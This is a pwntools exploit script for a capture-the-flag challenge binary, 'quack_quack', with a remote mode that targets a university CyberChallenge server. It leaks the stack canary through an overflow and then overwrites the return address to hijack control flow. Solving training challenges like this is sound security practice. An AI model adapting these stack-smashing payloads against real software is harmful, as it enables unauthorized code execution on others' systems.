from pwn import *
import sys
from struct import pack

if len(sys.argv) != 2 or sys.argv[1] not in ("debug", "remote", "local"):
    print("Use: python3 exploit.py debug | remote | local")
    sys.exit(1)

MODE = sys.argv[1]

if MODE == "debug":
    # r = process("./quack_quack", env={"LD_PRELOAD":"./glibc/libc.so.6"})
    # gdb.attach(r,
    # # break *main+139
    # """
    # break *duckling
    # continue
    # """)
    r = gdb.debug('./quack_quack', env={"LD_PRELOAD":"./glibc/libc.so.6"}, 
              gdbscript='''
                break duckling
                break *0x0000000000401562
                break *0x0000000000401567
                break *0x00000000004015f3
                continue
              '''
              )

if MODE == "remote":
    r = remote("cyberchallenge.disi.unitn.it", 50231)

if MODE == "local":
    r = process("./quack_quack", env={"LD_PRELOAD":"./glibc/libc.so.6"})

input = 'A' * 89 + "Quack Quack "
r.sendlineafter(b'> ', input.encode())

dump = r.recvline()

canary = b'\0' + dump[12:][:7]
print(f"Canary {canary.hex()}")

r.sendafter(b'> ', b'A' * 0x58 + canary + b'A' * 8 + pack('<I', 0x40137f))

r.interactive()